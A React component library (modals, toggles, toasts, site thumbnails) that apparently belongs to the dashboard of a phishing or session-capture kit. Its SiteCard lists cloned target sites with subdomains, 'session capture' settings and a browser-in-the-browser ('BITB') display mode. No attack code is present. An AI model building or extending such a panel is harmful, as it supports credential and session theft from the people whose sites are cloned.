import * as React from "react";
import Link from "next/link";
import { ChevronDown, ExternalLink, Trash2, CheckCircle, AlertCircle, AlertTriangle, Info, X } from "lucide-react";
import { useScrollLock } from "@/components/use-media-query";

export function cx(...parts) {
  return parts.filter(Boolean).join(" ");
}



export function Drawer({ open, onClose, children }) {
  useScrollLock(open);

  React.useEffect(() => {
    if (!open) return;
    function onKey(event) {
      if (event.key === "Escape") onClose();
    }
    document.addEventListener("keydown", onKey);
    return () => document.removeEventListener("keydown", onKey);
  }, [open, onClose]);

  return (
    <div className={cx("fixed inset-0 z-50", open ? "" : "pointer-events-none")}>
      <div
        onClick={onClose}
        className={cx(
          "absolute inset-0 bg-black/25 transition-opacity duration-200",
          open ? "opacity-100" : "opacity-0"
        )}
      />
      <div
        className={cx(
          "absolute inset-y-0 left-0 w-[min(280px,86vw)] transition-transform duration-200 ease-out",
          open ? "translate-x-0" : "-translate-x-full"
        )}
      >
        {children}
      </div>
    </div>
  );
}



export function useDismiss(open, onClose) {
  const ref = React.useRef(null);

  React.useEffect(() => {
    if (!open) return;

    function onPointerDown(event) {
      if (ref.current && !ref.current.contains(event.target)) onClose();
    }
    function onKey(event) {
      if (event.key === "Escape") onClose();
    }

    document.addEventListener("mousedown", onPointerDown);
    document.addEventListener("keydown", onKey);
    return () => {
      document.removeEventListener("mousedown", onPointerDown);
      document.removeEventListener("keydown", onKey);
    };
  }, [open, onClose]);

  return ref;
}



export function Toggle({ checked, onChange, label }) {
  return (
    <button
      type="button"
      role="switch"
      aria-checked={checked}
      aria-label={label}
      onClick={() => onChange?.(!checked)}
      className={cx(
        "relative h-[22px] w-[40px] shrink-0 rounded-full transition-all duration-300 ease-[cubic-bezier(0.32,0.72,0,1)] focus-visible:ring-2 focus-visible:ring-accent/40",
        checked ? "bg-accent" : "bg-stroke"
      )}
    >
      <span
        className={cx(
          "absolute top-[3px] h-[16px] w-[16px] rounded-full bg-white transition-all duration-300 ease-[cubic-bezier(0.32,0.72,0,1)]",
          checked ? "left-[21px]" : "left-[3px]"
        )}
      />
    </button>
  );
}



export function GhostSelect({ value, options, onChange, align = "right", className = "" }) {
  const [open, setOpen] = React.useState(false);
  const ref = useDismiss(open, () => setOpen(false));

  return (
    <div ref={ref} className={cx("relative", className)}>
      <button
        type="button"
        onClick={() => setOpen((v) => !v)}
        className="flex h-[26px] items-center gap-[6px] rounded-[6px] px-[8px] text-[13px] text-fg transition-colors hover:bg-line"
      >
        {value}
        <ChevronDown className="h-[13px] w-[13px] text-fg3" strokeWidth={1.9} />
      </button>
      {open ? (
        <div
          className={cx(
            "absolute top-[30px] z-50 max-w-[calc(100vw-20px)] min-w-[160px] animate-popIn rounded-[8px] border border-stroke bg-raised p-[4px]",
            align === "right" ? "right-0" : "left-0"
          )}
        >
          {options.map((option) => (
            <button
              key={option}
              type="button"
              onClick={() => {
                onChange?.(option);
                setOpen(false);
              }}
              className={cx(
                "flex h-[28px] w-full items-center rounded-[5px] px-[8px] text-left text-[13px] transition-colors hover:bg-pressed",
                option === value ? "text-fg" : "text-fg2"
              )}
            >
              {option}
            </button>
          ))}
        </div>
      ) : null}
    </div>
  );
}



export function Card({ children, className = "" }) {
  const hasOverflowOverride = /overflow-(visible|auto|scroll|y-visible|y-auto|y-scroll|x-visible|x-auto|x-scroll)/.test(
    className
  );
  return (
    <div
      className={cx(
        "rounded-[12px] border border-line bg-surface",
        hasOverflowOverride ? "" : "overflow-hidden",
        className
      )}
    >
      {children}
    </div>
  );
}

export function SettingRow({ title, description, children, className = "" }) {
  return (
    <div
      className={cx(
        "flex items-center justify-between gap-[16px] border-b border-line px-[14px] py-[14px] last:border-b-0 md:gap-[24px] md:px-[18px] md:py-[15px]",
        className
      )}
    >
      <div className="min-w-0">
        <div className="text-[13px] leading-[18px] text-fg">{title}</div>
        {description ? (
          <div className="mt-[2px] text-[12.5px] leading-[17px] text-fg3">{description}</div>
        ) : null}
      </div>
      {children ? <div className="flex shrink-0 items-center">{children}</div> : null}
    </div>
  );
}

export function SectionHeading({ title, description, className = "" }) {
  return (
    <div className={cx("mb-[14px]", className)}>
      <h2 className="text-[14px] font-bold leading-[20px] tracking-tight text-fg">{title}</h2>
      {description ? (
        <p className="mt-[3px] text-[12.5px] leading-[18px] text-fg3">{description}</p>
      ) : null}
    </div>
  );
}



export function BlueButton({ children, className = "", ...props }) {
  return (
    <button
      type="button"
      className={cx(
        "flex h-[30px] items-center gap-[6px] rounded-[7px] bg-accent px-[13px] text-[12.5px] font-semibold text-white transition-all duration-200 ease-[cubic-bezier(0.32,0.72,0,1)] hover:bg-accent-hover active:scale-[0.97] disabled:cursor-not-allowed disabled:opacity-50",
        className
      )}
      {...props}
    >
      {children}
    </button>
  );
}

export function GhostButton({ children, className = "", ...props }) {
  return (
    <button
      type="button"
      className={cx(
        "flex h-[30px] items-center gap-[6px] rounded-[7px] border border-stroke bg-raised px-[12px] text-[12.5px] font-semibold text-fg2 transition-all duration-200 ease-[cubic-bezier(0.32,0.72,0,1)] hover:bg-hover hover:text-fg active:scale-[0.97] disabled:cursor-not-allowed disabled:opacity-50",
        className
      )}
      {...props}
    >
      {children}
    </button>
  );
}



export function Badge({ tone, children, className = "" }) {
  return (
    <span
      className={cx(
        "rounded-[4px] px-[5px] py-[1px] text-[10.5px] font-medium leading-[14px]",
        className,
        tone === "new"
          ? "bg-success/10 text-success"
          : "bg-pressed text-fg3"
      )}
    >
      {children}
    </span>
  );
}

export function InfoDot({ className = "" }) {
  return (
    <span
      className={cx(
        "inline-flex h-[13px] w-[13px] items-center justify-center rounded-full border border-stroke text-[9px] leading-none text-fg3",
        className
      )}
    >
      i
    </span>
  );
}




export function Favicon({ url, subdomain, size = 20, className = "" }) {
  const [src, setSrc] = React.useState(null);
  const [failed, setFailed] = React.useState(false);

  React.useEffect(() => {
    setFailed(false);
    if (!url) {
      setSrc(null);
      return;
    }
    try {
      const u = new URL(url);
      
      setSrc(`${u.origin}/favicon.ico`);
    } catch {
      
      const domain = (url || "").replace(/^https?:\/\//, "").replace(/^www\./, "").split("/")[0];
      if (domain) {
        setSrc(`https://www.google.com/s2/favicons?domain=${domain}&sz=64`);
      } else {
        setSrc(null);
      }
    }
  }, [url]);

  const googleFallback = React.useMemo(() => {
    if (!url) return null;
    try {
      const u = new URL(url);
      return `https://www.google.com/s2/favicons?domain=${u.hostname}&sz=64`;
    } catch {
      const domain = (url || "").replace(/^https?:\/\//, "").replace(/^www\./, "").split("/")[0];
      return domain ? `https://www.google.com/s2/favicons?domain=${domain}&sz=64` : null;
    }
  }, [url]);

  const letter = (subdomain || "?").slice(0, 1).toUpperCase();

  if (failed || !src) {
    return (
      <span
        className={cx(
          "flex shrink-0 items-center justify-center rounded-[4px] bg-pressed font-bold text-fg2",
          className
        )}
        style={{ width: size, height: size, fontSize: Math.max(8, size * 0.45) }}
      >
        {letter}
      </span>
    );
  }

  return (
    <img
      src={src}
      alt=""
      width={size}
      height={size}
      className={cx("shrink-0 rounded-[4px] bg-pressed object-contain", className)}
      onError={(e) => {
        if (googleFallback && e.target.src !== googleFallback) {
          e.target.src = googleFallback;
        } else {
          setFailed(true);
        }
      }}
    />
  );
}




export function SiteThumbnail({ url, subdomain, targetUrl, className = "" }) {
  const [src, setSrc] = React.useState(null);
  const [loading, setLoading] = React.useState(true);
  const [failed, setFailed] = React.useState(false);

  
  const tryFetchScreenshot = React.useCallback(async (fetchUrl, cacheKey) => {
    const microlinkUrl = `https://api.microlink.io/?url=${encodeURIComponent(fetchUrl)}&screenshot=true&meta=false&viewport.width=1280&viewport.height=800&waitUntil=networkidle0`;
    const r = await fetch(microlinkUrl);
    const data = await r.json();
    const screenshot = data?.data?.screenshot?.url;
    if (screenshot) {
      try {
        localStorage.setItem(cacheKey, JSON.stringify({ src: screenshot, ts: Date.now() }));
      } catch {}
      return screenshot;
    }
    return null;
  }, []);

  React.useEffect(() => {
    if (!url) {
      setFailed(true);
      setLoading(false);
      return;
    }

    
    const cacheKey = `thumb:${url}`;
    const targetCacheKey = targetUrl ? `thumb:${targetUrl}` : null;
    try {
      const cached = localStorage.getItem(cacheKey) || (targetCacheKey ? localStorage.getItem(targetCacheKey) : null);
      if (cached) {
        const parsed = JSON.parse(cached);
        if (Date.now() - parsed.ts < 86400000 && parsed.src) {
          setSrc(parsed.src);
          setLoading(false);
          return;
        }
      }
    } catch {}

    let cancelled = false;

    
    (async () => {
      try {
        
        let screenshot = await tryFetchScreenshot(url, cacheKey);
        if (cancelled) return;

        
        if (!screenshot && targetUrl && targetUrl !== url) {
          screenshot = await tryFetchScreenshot(targetUrl, targetCacheKey || cacheKey);
        }
        if (cancelled) return;

        if (screenshot) {
          setSrc(screenshot);
        } else {
          setFailed(true);
        }
      } catch {
        if (!cancelled) setFailed(true);
      } finally {
        if (!cancelled) setLoading(false);
      }
    })();

    return () => { cancelled = true; };
  }, [url, targetUrl, tryFetchScreenshot]);

  if (loading) {
    return (
      <div className={cx("flex items-center justify-center bg-surface", className)}>
        <div className="h-[20px] w-[20px] animate-spin rounded-full border-[2px] border-stroke border-t-accent" />
      </div>
    );
  }

  if (failed || !src) {
    
    return (
      <div className={cx("relative flex items-center justify-center overflow-hidden bg-panel", className)}>
        <div className="absolute inset-0 opacity-[0.04]" style={{
          backgroundImage: "radial-gradient(circle at 30% 20%, #fff 0%, transparent 50%), radial-gradient(circle at 70% 80%, #fff 0%, transparent 50%)",
        }} />
        <Favicon url={targetUrl || url} subdomain={subdomain} size={56} className="relative" />
      </div>
    );
  }

  return (
    <img
      src={src}
      alt=""
      className={cx("h-full w-full object-cover object-top", className)}
      onError={() => setFailed(true)}
      loading="lazy"
    />
  );
}




export function SiteCard({ site, healthStatus, ruleCount, siteUrl, onToggleLive, onDelete, isSessionSite = false }) {
  const [tapped, setTapped] = React.useState(false);
  const isLive = site.mode === "live";
  const displayMode = site.session_capture_config?.display_mode || "redirect";
  const isBitb = isSessionSite && displayMode === "bitb";

  const handleCardClick = (e) => {
    
    if (!tapped) {
      e.preventDefault();
      setTapped(true);
      return;
    }
  };

  return (
    <div
      className={cx(
        "group relative overflow-hidden rounded-[10px] border bg-surface transition-all",
        tapped ? "border-accent" : "border-line hover:border-stroke"
      )}
      onMouseLeave={() => setTapped(false)}
    >
      {}
      <Link
        href={`/sites/${site.id}`}
        onClick={handleCardClick}
        className="block"
      >
        <div className="relative aspect-[16/10] w-full overflow-hidden bg-panel">
          <SiteThumbnail
            url={siteUrl}
            subdomain={site.subdomain}
            targetUrl={site.target_url}
            className="h-full w-full"
          />

          {}
          <div
            className={cx(
              "absolute inset-0 flex items-center justify-center gap-[8px] bg-black/70 backdrop-blur-[2px] transition-opacity",
              tapped ? "opacity-100" : "opacity-0 group-hover:opacity-100"
            )}
          >
            <a
              href={siteUrl}
              target="_blank"
              rel="noreferrer"
              onClick={(e) => e.stopPropagation()}
              title="Open site in a new tab"
              className="flex h-[32px] items-center gap-[5px] rounded-[6px] bg-pressed px-[12px] text-[12px] font-medium text-fg transition-colors hover:bg-hover"
            >
              <ExternalLink className="h-[13px] w-[13px]" strokeWidth={1.8} />
              Open
            </a>
            <button
              type="button"
              onClick={(e) => { e.preventDefault(); e.stopPropagation(); onToggleLive(); }}
              title={isLive ? "Switch this site to dev mode" : "Switch this site to live mode"}
              className="flex h-[32px] items-center gap-[5px] rounded-[6px] bg-pressed px-[12px] text-[12px] font-medium text-fg transition-colors hover:bg-hover"
            >
              {isLive ? "Set Dev" : "Set Live"}
            </button>
            <button
              type="button"
              onClick={(e) => { e.preventDefault(); e.stopPropagation(); onDelete(); }}
              title="Delete this site and all its rules"
              className="flex h-[32px] w-[32px] items-center justify-center rounded-[6px] bg-pressed text-fg transition-colors hover:bg-errorBorder hover:text-error"
            >
              <Trash2 className="h-[14px] w-[14px]" strokeWidth={1.8} />
            </button>
          </div>

          {}
          <div className="absolute right-[8px] top-[8px] flex items-center gap-[4px]">
            <span className={cx(
              "rounded-[4px] px-[6px] py-[2px] text-[9.5px] font-medium uppercase backdrop-blur-[2px]",
              isLive ? "bg-accent/90 text-white" : "bg-black/60 text-fg2"
            )}>
              {isLive ? "Live" : "Dev"}
            </span>
            {isSessionSite ? (
              <span className={cx(
                "rounded-[4px] px-[6px] py-[2px] text-[9.5px] font-medium uppercase backdrop-blur-[2px]",
                isBitb ? "bg-accent/90 text-white" : "bg-black/60 text-fg2"
              )}>
                {isBitb ? "BITB" : "Normal"}
              </span>
            ) : null}
            {isSessionSite && site.session_capture_config?.module_id ? (
              <span className="rounded-[4px] bg-black/60 px-[6px] py-[2px] text-[9.5px] font-medium uppercase text-[#3dd68c] backdrop-blur-[2px]">
                Uni-Con
              </span>
            ) : null}
          </div>

          {}
          <div className="absolute bottom-[8px] left-[8px]">
            <span className={cx(
              "rounded-[4px] px-[6px] py-[2px] text-[9.5px] font-medium uppercase backdrop-blur-[2px]",
              healthStatus === "up" ? "bg-black/60 text-fg" : healthStatus === "down" ? "bg-accent/90 text-white" : "bg-black/60 text-fg4"
            )}>
              {healthStatus}
            </span>
          </div>
        </div>
      </Link>

      {}
      <Link href={`/sites/${site.id}`} className="block px-[12px] py-[10px]">
        <div className="flex items-center gap-[8px]">
          <Favicon url={site.target_url} subdomain={site.subdomain} size={16} />
          <span className="min-w-0 flex-1 truncate text-[13px] font-medium text-fg">
            {site.subdomain}
          </span>
          <span className="shrink-0 text-[10.5px] text-fg4">
            {ruleCount} {ruleCount === 1 ? "rule" : "rules"}
          </span>
        </div>
        {site.base_domain ? (
          <div className="mt-[3px] truncate text-[11px] text-fg4">
            .{site.base_domain}
          </div>
        ) : null}
      </Link>
    </div>
  );
}



export function Modal({ open, onClose, children, className = "" }) {
  const panelRef = React.useRef(null);
  const previousFocus = React.useRef(null);
  useScrollLock(open);

  React.useEffect(() => {
    if (!open) return;
    
    previousFocus.current = document.activeElement;
    
    const panel = panelRef.current;
    if (panel) {
      const focusable = panel.querySelector('button, input, select, textarea, a[href], [tabindex]');
      (focusable || panel).focus();
    }
    function onKey(event) {
      if (event.key === "Escape") { onClose(); return; }
      
      if (event.key === "Tab" && panel) {
        const focusables = panel.querySelectorAll('button, input, select, textarea, a[href], [tabindex]:not([tabindex="-1"])');
        if (focusables.length === 0) return;
        const first = focusables[0];
        const last = focusables[focusables.length - 1];
        if (event.shiftKey && document.activeElement === first) {
          event.preventDefault();
          last.focus();
        } else if (!event.shiftKey && document.activeElement === last) {
          event.preventDefault();
          first.focus();
        }
      }
    }
    document.addEventListener("keydown", onKey);
    return () => {
      document.removeEventListener("keydown", onKey);
      
      if (previousFocus.current && typeof previousFocus.current.focus === 'function') {
        previousFocus.current.focus();
      }
    };
  }, [open, onClose]);

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-[60] flex items-end justify-center sm:items-center sm:p-[16px]">
      <div
        onClick={onClose}
        className="absolute inset-0 bg-black/40 animate-fadeIn"
      />
      <div
        ref={panelRef}
        tabIndex={-1}
        className={cx(
          "relative z-10 w-full max-w-[420px] animate-slideUp sm:animate-popIn rounded-t-[16px] sm:rounded-[10px] border border-stroke bg-panel",
          "max-h-[85vh] overflow-y-auto outline-none",
          className
        )}
      >
        {}
        <button
          type="button"
          onClick={onClose}
          aria-label="Close dialog"
          className="absolute right-[12px] top-[12px] z-20 flex h-[26px] w-[26px] items-center justify-center rounded-[6px] text-fg3 transition-colors hover:bg-pressed hover:text-fg"
        >
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="h-[14px] w-[14px]">
            <path d="M18 6L6 18M6 6l12 12" />
          </svg>
        </button>
        {}
        <div className="flex justify-center pt-[8px] sm:hidden">
          <div className="h-[4px] w-[36px] rounded-full bg-stroke" />
        </div>
        {children}
      </div>
    </div>
  );
}



export function ConfirmDialog({
  open,
  onClose,
  onConfirm,
  title = "Confirm",
  message,
  confirmLabel = "Confirm",
  cancelLabel = "Cancel",
  danger = false,
  warning = false,
}) {
  return (
    <Modal open={open} onClose={onClose}>
      <div className="p-[20px]">
        <div className="text-[14px] font-medium text-fg">{title}</div>
        {message ? (
          <div className="mt-[8px] text-[12.5px] leading-[18px] text-fg3 whitespace-pre-wrap">
            {message}
          </div>
        ) : null}
        <div className="mt-[18px] flex items-center justify-end gap-[8px]">
          <GhostButton onClick={onClose}>{cancelLabel}</GhostButton>
          <button
            type="button"
            onClick={() => { onConfirm?.(); onClose?.(); }}
            className={cx(
              "flex h-[28px] items-center gap-[5px] rounded-[6px] px-[12px] text-[12.5px] font-medium transition-colors",
              danger
                ? "bg-error text-white hover:opacity-90"
                : warning
                  ? "bg-warning text-white hover:opacity-90"
                  : "bg-accent text-white hover:bg-accentHover"
            )}
          >
            {confirmLabel}
          </button>
        </div>
      </div>
    </Modal>
  );
}



const ToastContext = React.createContext(null);

export function ToastProvider({ children }) {
  const [toasts, setToasts] = React.useState([]);

  const dismiss = React.useCallback((id) => {
    setToasts((prev) => prev.filter((t) => t.id !== id));
  }, []);

  const show = React.useCallback((opts) => {
    const id = `toast-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
    const toast = {
      id,
      type: opts.type || "info",
      message: opts.message || "",
      duration: opts.duration ?? 4000,
    };
    setToasts((prev) => [...prev, toast]);
    if (toast.duration > 0) {
      setTimeout(() => dismiss(id), toast.duration);
    }
    return id;
  }, [dismiss]);

  const api = React.useMemo(() => ({
    show,
    dismiss,
    success: (msg, dur) => show({ type: "success", message: msg, duration: dur }),
    error: (msg, dur) => show({ type: "error", message: msg, duration: dur ?? 6000 }),
    warning: (msg, dur) => show({ type: "warning", message: msg, duration: dur }),
    info: (msg, dur) => show({ type: "info", message: msg, duration: dur }),
  }), [show, dismiss]);

  return (
    <ToastContext.Provider value={api}>
      {children}
      <ToastViewport toasts={toasts} onDismiss={dismiss} />
    </ToastContext.Provider>
  );
}

export function useToast() {
  const ctx = React.useContext(ToastContext);
  if (!ctx) throw new Error("useToast must be used within ToastProvider");
  return ctx;
}

function ToastViewport({ toasts, onDismiss }) {
  if (toasts.length === 0) return null;
  return (
    <div className="pointer-events-none fixed bottom-[20px] right-[20px] z-[200] flex flex-col gap-[8px]">
      {toasts.map((t) => (
        <ToastItem key={t.id} toast={t} onDismiss={() => onDismiss(t.id)} />
      ))}
    </div>
  );
}

function ToastItem({ toast, onDismiss }) {
  const icons = {
    success: CheckCircle,
    error: AlertCircle,
    warning: AlertTriangle,
    info: Info,
  };
  const Icon = icons[toast.type] || Info;
  return (
    <div
      className={cx(
        "pointer-events-auto flex items-start gap-[10px] rounded-[8px] border bg-panel px-[14px] py-[10px] animate-popIn",
        toast.type === "error" ? "border-errorBorder" :
        toast.type === "warning" ? "border-warningBorder" :
        "border-stroke"
      )}
    >
      <Icon
        className={cx(
          "mt-[1px] h-[15px] w-[15px] shrink-0",
          toast.type === "error" ? "text-error" :
          toast.type === "warning" ? "text-warning" :
          toast.type === "success" ? "text-accent" :
          "text-fg3"
        )}
        strokeWidth={1.8}
      />
      <span className="min-w-0 flex-1 text-[12.5px] leading-[18px] text-fg2">{toast.message}</span>
      <button
        type="button"
        onClick={onDismiss}
        className="mt-[1px] flex h-[14px] w-[14px] shrink-0 items-center justify-center text-fg4 transition-colors hover:text-fg"
      >
        <X className="h-[12px] w-[12px]" strokeWidth={1.8} />
      </button>
    </div>
  );
}
